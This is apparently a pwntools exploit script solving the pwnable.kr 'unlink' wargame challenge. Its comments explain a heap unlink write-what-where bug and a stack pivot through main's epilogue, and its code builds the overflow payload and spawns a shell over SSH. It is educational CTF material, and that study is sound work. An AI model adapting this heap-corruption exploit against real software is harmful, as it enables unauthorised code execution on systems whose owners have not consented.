from pwn import *

# unlink
host = 'pwnable.kr'
user = 'unlink'
password = 'guest'
port = 2222

# Notes
#  * This is a classic "unlink" vulnerability. This vulnerability usually shows
#    up when you're about to malloc a free'd chunk in the middle of a free list.
#  * In this case, the challenge simulates this by constructing a doublly linked
#    list out of three malloc'd chunks: A <--> B <--> C.
#  * The `gets` called on A's buffer allows you to clobber B's forward and
#    backwards pointers. So, when you call `unlink` on B, you have a write-what-
#    where vulnerability
#  * Our initial thought would be to overwrite the return value with the address
#    of the `shell` function. This doesn't work because `unlink` actually
#    performs *two* writes. One writes BK to FD->bk and the other writes
#    FD to BK->fd. Thus, both FD and BK need to be set to *writable* addresses,
#    and the address of `shell`, being in the .text region, is not writable.
#  * A second idea might be to overwrite the return address with a heap address
#    and execute shellcode from our buffer on the heap. Alas, NX is enabled
#    so this strategy will fail as well.
#  * The trick involves the binary's strange epilogue for `main`:
#        ```
#        0x080485f7 <+200>:	add    esp,0x10
#        0x080485fa <+203>:	mov    eax,0x0
#        0x080485ff <+208>:	mov    ecx,DWORD PTR [ebp-0x4]
#        0x08048602 <+211>:	leave
#        0x08048603 <+212>:	lea    esp,[ecx-0x4]
#        0x08048606 <+215>:	ret
#        ```
#  * Notice that at 0x08048603, esp is set to ecx-0x4, which is in turn equal
#    to [ebp-0x4]. The idea is as follows: by writing to ebp-0x4, which is on
#    the stack, we can set the value of esp to point to wherever we want.
#  * The address that the program returns to is determined by what address
#    esp is pointing to. So, if we have esp point to an address that we control,
#    we can return to wherever we want. What's an address we control? The heap.
#  * Critically, since both the heap and the stack are writable, we won't
#    segfault during the two writes of `unlink`
#  * Our overflow looks like this:
#
#      ------------------
#      |  shell() addr  | <--- Start of A's buffer
#      +----------------+
#      |      AAAA      | <--- End of A's buffer
#   A  +----------------+
#      |      AAAA      | <--- Size of chunk B
#      +----------------+
#      |      AAAA      | <--- NULL
# -----+----------------+
#   B  | ebp - 0x4 - 0x4| <--- B's forward pointer
#      +----------------+
#      |    &(A->buf)   | <--- B's backwards pointer
#      ------------------
#
#  * We set FD to ebp - 0x4 - 0x4 such that when we write to FD->bk, we are
#    writing to ebp - 0x4
#  * We can compute ebp - 0x4 - 0x4 from our leaked stack address and
#    &(A->buf) from our leaked heap address. (Offsets are +20 and +12 resp.)

def attack():
  s = ssh(host=host, user=user, password=password, port=port)
  p = s.process(['./unlink'])

  # leaks
  stack_address = p.readline()
  stack_address = int(stack_address[stack_address.index('0x') + 2:-1],16)
  heap_address = p.readline()
  heap_address = int(heap_address[heap_address.index('0x') + 2:-1],16)
  p.readline()

  # offsets / addresses
  ebp = stack_address + 5 * 4
  FD = ebp - 2 * 4 # ebp - 0x4 - 0x4
  BK = heap_address + 3 * 4 # &(A->buf)
  shell = 0x080484eb

  # exploit
  overflow = p32(shell) + 'A' * 12 + p32(FD) + p32(BK)
  p.sendline(overflow)
  p.interactive()

if __name__ == '__main__':
  attack()
